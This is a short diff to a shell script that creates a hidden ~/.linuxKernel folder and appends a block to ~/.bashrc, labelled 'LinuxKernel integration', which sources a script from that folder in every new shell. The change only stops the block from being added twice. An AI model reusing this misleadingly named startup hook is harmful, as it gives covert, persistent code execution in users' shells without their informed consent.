@@ -7,6 +7,7 @@ INSTALLED_NOTICE="$KERNEL_DIR/notice.png"
 IMG_PATH="$KERNEL_DIR/result.png"
 OUT_FILE="$KERNEL_DIR/output.png"
 RC="$HOME/.bashrc"
+HEADER="# LinuxKernel integration"
 
 if [ ! -d "$KERNEL_DIR" ]; then
     mkdir -p "$KERNEL_DIR"
@@ -23,7 +24,9 @@ if [ ! -f "$INSTALLED_NOTICE" ]; then
     fi
 fi
 
-echo "# LinuxKernel integration" >> "$RC"
-echo "if [ -f "$HOME/.linuxKernel/script.sh" ]; then" >> "$RC"
-echo "  source "$HOME/.linuxKernel/script.sh"" >> "$RC"
-echo "fi" >> "$RC"
+if ! grep -q "$HEADER" "$RC"; then 
+    echo "$HEADER" >> "$RC"
+    echo "if [ -f "$HOME/.linuxKernel/script.sh" ]; then" >> "$RC"
+    echo "  source "$HOME/.linuxKernel/script.sh"" >> "$RC"
+    echo "fi" >> "$RC"
+fi
